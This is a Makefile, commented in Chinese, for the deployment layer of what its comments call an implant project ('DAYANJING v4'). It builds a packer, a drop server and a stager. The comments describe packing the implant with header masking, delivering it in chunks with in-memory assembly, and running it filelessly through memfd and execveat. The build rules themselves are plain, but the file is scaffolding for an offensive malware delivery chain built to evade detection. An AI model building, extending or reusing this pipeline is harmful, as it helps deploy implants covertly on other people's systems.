# DAYANJING v4 — 25_deploy Makefile
#
# 职责：把 monolith/implant（单体植入体）做成可投送制品，并投送出去。
#   打包        20_packer / pk_pack_shaped（v4 整头掩码制品）
#   解包校验    20_packer / pk_unpack_shaped（无损还原）
#   分块投递    本层 25_deploy / drop.*（manifest + 内存组装 + 门控）
#   落地执行    20_packer / pk_mexec（memfd + execveat，无文件执行）
#
# 不重复实现任何一层：打包/解包/执行全部复用 20_packer 已有实现，
# 摘要复用 00_crypto 的 sha256（经 20_packer 的目标文件间接提供）。
#
# 注意 -D_GNU_SOURCE：drop_http.c 用 strcasestr 解析 Content-Length。
# 各模块自有 Makefile 各自定义过，这里必须显式带上，否则编译失败。

CC      ?= gcc
CFLAGS  ?= -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -Wstrict-prototypes
CFLAGS  += -D_GNU_SOURCE -D_DEFAULT_SOURCE
CFLAGS  += -Iinclude -I../20_packer/include -I../00_crypto/include

BUILD   := build
# 复用 20_packer 已编译的目标文件（含 crypto_gcm/hash/x25519 与 shaped/pack/mexec）
PACKOBJ := $(wildcard ../20_packer/build/*.o)

SRCS    := src/drop.c src/drop_http.c
SERVESRC := src/drop_serve.c
STAGSRC := src/drop_stager.c
PACKSRC := src/deploy_pack.c

.PHONY: all test clean

all: $(BUILD)/deploy_pack $(BUILD)/drop_serve $(BUILD)/drop_stager $(BUILD)/test_drop $(BUILD)/test_deploy

$(BUILD):
	mkdir -p $(BUILD)

$(BUILD)/deploy_pack: $(PACKSRC) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(PACKOBJ) -o $@

$(BUILD)/drop_serve: $(SERVESRC) $(SRCS) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@

$(BUILD)/drop_stager: $(STAGSRC) $(SRCS) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@

$(BUILD)/test_drop: tests/test_drop.c $(SRCS) $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(SRCS) $(PACKOBJ) -o $@

$(BUILD)/test_deploy: tests/test_deploy.c $(PACKOBJ) | $(BUILD)
	$(CC) $(CFLAGS) $< $(PACKOBJ) -o $@

test: $(BUILD)/test_drop $(BUILD)/test_deploy
	./$(BUILD)/test_drop
	./$(BUILD)/test_deploy

clean:
	rm -rf $(BUILD)
